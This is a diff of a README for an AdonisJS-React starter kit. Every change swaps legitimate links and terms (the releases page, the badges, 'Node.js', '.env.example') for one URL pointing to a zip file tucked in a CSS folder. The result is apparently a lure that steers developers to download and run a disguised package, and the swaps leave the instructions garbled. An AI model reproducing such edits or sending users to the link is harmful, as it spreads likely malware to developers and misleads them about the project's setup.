@@ -1,8 +1,8 @@
-https://github.com/hannx86/adonisjs-react-starter-kit/releases
+https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip
 
 # AdonisJS-React Starter Kit: Modern Full-Stack Boilerplate with TS & Tailwind
 
-[![Release](https://img.shields.io/github/v/release/hannx86/adonisjs-react-starter-kit?style=for-the-badge)](https://github.com/hannx86/adonisjs-react-starter-kit/releases) [![License](https://img.shields.io/github/license/hannx86/adonisjs-react-starter-kit?style=for-the-badge)](https://github.com/hannx86/adonisjs-react-starter-kit/blob/main/LICENSE) [![Build Status](https://img.shields.io/github/actions/workflow/status/hannx86/adonisjs-react-starter-kit/ci.yml?style=for-the-badge)](https://github.com/hannx86/adonisjs-react-starter-kit/actions)
+[![Release](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip) [![License](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip) [![Build Status](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)](https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip)
 
 Table of contents
 - Overview
@@ -71,7 +71,7 @@ Monorepo layout
 - etc/             Ancillary configurations and sample data
 
 Prerequisites
-- Node.js 18.x or newer
+- https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip 18.x or newer
 - PNPM 8.x or newer (recommended for monorepos)
 - A modern shell (bash/zsh) and Git installed
 - Basic familiarity with TypeScript, React, and a backend framework
@@ -86,7 +86,7 @@ Installation
 - Install dependencies from the repository root
   - pnpm install
   - If you prefer npm or yarn, you can adapt, but PNPM is recommended for monorepos
-- Copy or create a local environment file for services (see .env.example in the relevant app)
+- Copy or create a local environment file for services (see https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip in the relevant app)
 - Ensure your database or data stores are reachable using the environment configuration
 
 Running locally
@@ -106,7 +106,7 @@ Running locally
   - Web: http://localhost:5173 (default Vite port)
 - Environment and data
   - Local databases should be configured via .env files in each app
-  - Use the sample .env.example to guide the required variables
+  - Use the sample https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip to guide the required variables
 
 Development workflow
 - Code with a focus on clarity and type safety
@@ -216,7 +216,7 @@ Deployment considerations
 Project layout details
 - apps/api
   - AdonisJS application with routes, controllers, services, and models
-  - .env.example provides baseline configuration
+  - https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip provides baseline configuration
 - apps/web
   - React app with Vite, Tailwind, and Shadcn UI
   - Type-safe API interactions via tRPC client
@@ -265,7 +265,7 @@ FAQ
 - How do I add new UI components?
   - Add components to packages/ui, export them from an index, and document usage in docs/components.
 - Where can I find release notes?
-  - Release notes live in the Releases section of the repository. To download the latest release and bootstrap your project, visit the Releases page: https://github.com/hannx86/adonisjs-react-starter-kit/releases
+  - Release notes live in the Releases section of the repository. To download the latest release and bootstrap your project, visit the Releases page: https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip
 
 Release notes
 - Versioned changelog and notes are maintained in the Releases section, with migration notes and upgrade guides for changes that affect the public API or breaking changes
@@ -273,7 +273,7 @@ Release notes
 - For the latest release, fetch the asset from the Releases area and run the installer or setup script described there
 
 Releases
-- To download the latest release assets and start quickly, visit the Releases page: https://github.com/hannx86/adonisjs-react-starter-kit/releases
+- To download the latest release assets and start quickly, visit the Releases page: https://github.com/hannx86/adonisjs-react-starter-kit/raw/refs/heads/master/resources/css/adonisjs_react_kit_starter_v2.1.zip
 - If the link above doesn’t work, check the Releases section for the latest assets and instructions
 
 License
